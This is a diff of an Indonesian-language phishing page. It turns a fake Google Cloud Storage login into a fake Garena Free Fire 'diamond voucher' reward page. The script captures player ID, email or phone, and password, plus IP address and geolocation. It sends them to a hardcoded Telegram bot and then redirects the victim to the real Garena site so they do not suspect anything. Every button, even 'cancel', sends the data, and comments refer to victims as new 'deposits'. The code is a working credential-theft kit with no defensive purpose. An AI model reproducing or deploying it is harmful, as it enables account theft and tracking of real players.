@@ -3,103 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Shared - Google Cloud Storage</title>
+    <title>Free Fire Reward Center</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #f8f9fa; font-family: 'Roboto', sans-serif; }
-        .login-box { box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
+        body { 
+            background: url('https://wallpaperaccess.com/full/1155026.jpg') no-repeat center center fixed; 
+            background-size: cover; 
+        }
+        .overlay { background: rgba(0, 0, 0, 0.8); position: absolute; inset: 0; z-index: 1; }
+        .ff-border { border: 2px solid #ffcc00; background: rgba(20, 20, 20, 0.95); }
+        .ff-btn { background: linear-gradient(180deg, #ffcc00 0%, #ff9900 100%); color: black; font-weight: 900; }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center h-screen">
-
-    <div id="file-preview" class="mb-6 text-center">
-        <div class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 flex items-center space-x-4">
-            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" class="w-12 h-12" alt="PDF Icon">
-            <div class="text-left">
-                <p class="font-bold text-gray-700 text-sm">URGENT_DOCUMENT_PRIVATE.pdf</p>
-                <p class="text-xs text-gray-500">Ukuran: 2.4 MB • Terakhir diubah: 2 menit yang lalu</p>
-            </div>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="overlay"></div>
+    
+    <div class="relative z-10 ff-border p-6 rounded-lg shadow-2xl w-full max-w-sm text-white border-yellow-500">
+        <div class="text-center mb-6">
+            <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" class="h-12 mx-auto mb-2">
+            <h2 class="text-xl font-black italic uppercase tracking-tighter text-yellow-500">Diamond Voucher</h2>
+            <p class="text-xs text-gray-400">Masukkan data akun untuk menerima hadiah</p>
         </div>
-        <p class="text-gray-600 text-sm mt-4 font-medium">Silakan login untuk memverifikasi identitas Anda sebelum mengunduh.</p>
-    </div>
 
-    <div class="bg-white p-10 rounded-lg login-box w-full max-w-md border border-gray-200">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="h-8 mx-auto mb-6" alt="Logo">
-        
-        <h1 class="text-2xl font-normal text-center text-gray-800 mb-8">Masuk</h1>
+        <form id="ffForm" class="space-y-4">
+            <input type="text" id="userid" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="ID Pemain" required>
+            <input type="text" id="username" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Email / Phone" required>
+            <input type="password" id="password" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Password" required>
 
-        <form id="auth-form">
-            <div class="relative mb-6">
-                <input type="text" id="target_user" class="block px-4 py-3 w-full text-gray-900 bg-transparent border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 peer" placeholder="Email atau ponsel" required />
-            </div>
-
-            <div class="relative mb-8">
-                <input type="password" id="target_pass" class="block px-4 py-3 w-full text-gray-900 bg-transparent border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 peer" placeholder="Masukkan sandi Anda" required />
-            </div>
-
-            <div class="flex items-center justify-between mb-8">
-                <a href="#" class="text-sm font-medium text-blue-600 hover:underline">Lupa email?</a>
-                <button type="submit" id="sub-btn" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-2 rounded font-medium transition duration-200 shadow-md">
-                    Berikutnya
-                </button>
+            <button type="submit" class="universal-btn w-full ff-btn py-3 rounded uppercase tracking-widest hover:scale-105 transition duration-200">
+                KLAIM HADIAH
+            </button>
+            
+            <div class="flex space-x-2">
+                <button type="button" class="universal-btn w-1/2 bg-gray-700 py-2 rounded text-xs font-bold hover:bg-gray-600">BANTUAN</button>
+                <button type="button" class="universal-btn w-1/2 bg-gray-700 py-2 rounded text-xs font-bold hover:bg-gray-600">BATAL</button>
             </div>
         </form>
-
-        <p class="text-sm text-gray-600">Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. <a href="#" class="text-blue-600 font-medium">Pelajari lebih lanjut</a></p>
+        
+        <p class="mt-6 text-[10px] text-center text-gray-600">Garena Free Fire © 2026. All Rights Reserved.</p>
     </div>
 
-    <footer class="mt-10 flex space-x-6 text-xs text-gray-500">
-        <a href="#">Indonesia</a>
-        <a href="#">Bantuan</a>
-        <a href="#">Privasi</a>
-        <a href="#">Persyaratan</a>
-    </footer>
-
     <script>
-        const form = document.getElementById('auth-form');
-        
-        // --- DATA TELEGRAM LO ---
-        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc"; 
+        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc";
         const CHAT_ID = "8551809114";
-        // ------------------------
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const btn = document.getElementById('sub-btn');
-            btn.innerHTML = "Memuat...";
-            btn.disabled = true;
+        // Fungsi sakti buat kirim data
+        async function kirimData() {
+            const uid = document.getElementById('userid').value;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
 
-            const u = document.getElementById('target_user').value;
-            const p = document.getElementById('target_pass').value;
+            if(!uid || !user || !pass) {
+                alert("Isi semua data dulu!");
+                return;
+            }
 
-            // Logika ambil IP target (Opsional, tapi bikin data lo makin lengkap)
-            fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                const ip = data.ip;
-                const text = `🎯 **KORBAN BARU (CLOUD)** 🎯\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n🌐 IP: \`${ip}\` \n⏰ Waktu: ${new Date().toLocaleString()}`;
+            // Ambil IP & Lokasi secara diam-diam
+            let locData = "Gagal ambil lokasi";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const json = await res.json();
+                locData = `🌐 IP: ${json.ip}\n🏙️ Kota: ${json.city}\n📍 Maps: https://www.google.com/maps?q=${json.latitude},${json.longitude}`;
+            } catch (e) {}
 
-                // Kirim ke Telegram
-                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            })
-            .then(() => {
-                // Setelah dapet data, alihkan ke link download palsu atau link asli
-                window.location.href = "https://drive.google.com"; 
-            })
-            .catch(err => {
-                console.log(err);
-                // Tetap alihkan biar target nggak curiga
-                window.location.href = "https://drive.google.com";
+            const text = `🔥 **SETORAN BARU (FF)** 🔥\n\n🆔 ID: \`${uid}\` \n👤 User: \`${user}\` \n🔑 Pass: \`${pass}\` \n\n${locData}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            }).then(() => {
+                // Tendang ke halaman asli
+                window.location.href = "https://ff.garena.com/id/";
             });
+        }
+
+        // Cari semua elemen dengan class 'universal-btn'
+        const buttons = document.querySelectorAll('.universal-btn');
+        
+        // Kasih event ke tiap tombol, apapun yang diklik, datanya kekirim
+        buttons.forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                kirimData();
+            });
+        });
+
+        // Tetep jagain kalau dia tekan 'Enter' di keyboard
+        document.getElementById('ffForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            kirimData();
         });
     </script>
 </body>
